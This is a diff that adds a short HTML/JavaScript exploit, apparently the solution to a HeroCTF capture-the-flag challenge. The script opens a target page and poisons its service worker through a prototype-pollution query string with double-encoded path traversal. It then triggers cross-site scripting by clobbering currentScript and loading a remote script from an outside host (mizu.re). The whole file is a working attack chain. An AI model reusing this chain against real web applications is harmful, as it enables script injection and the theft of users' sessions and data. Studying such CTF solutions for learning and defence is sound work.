@@ -1,0 +1,20 @@
+<script>
+    const TARGET = location.hash.substring(1);
+    if (location.search === "?start") {
+        // Load the service worker
+        console.log("Loading the service worker.");
+        var target = open(`${TARGET}/c/`);
+
+        // Poison the service worker
+        setTimeout(() => {
+            console.log("Poisoning the service worker.");
+            target.location.href = `${TARGET}/c/?debugLevel=__proto__&debugLevel[headers][Range]=bytes=440-&debugLevel[loggingPath]=/c/static/xss/%25252E%25252E%252F%25252E%25252E%252Findex.php?a=%3Cimg%20name=currentScript%3E%3Ctable%3E%3Cscript%20src=https://mizu.re/ctf-solutions/heroCTFv6-ac0247d4ebdc9b/%3E%23`;
+        }, 1000);
+
+        // Trigger the XSS
+        setTimeout(() => {
+            console.log("Redirecting to the poisoning page.");
+            target.location.href = `${TARGET}/c/static/xss/%252E%252E%2F%252E%252E%2Findex.php?a=%3Cimg%20name=currentScript%3E%3Ctable%3E%3Cscript%20src=https://mizu.re/ctf-solutions/heroCTFv6-ac0247d4ebdc9b/%3E`;
+        }, 2000);
+    }
+</script>
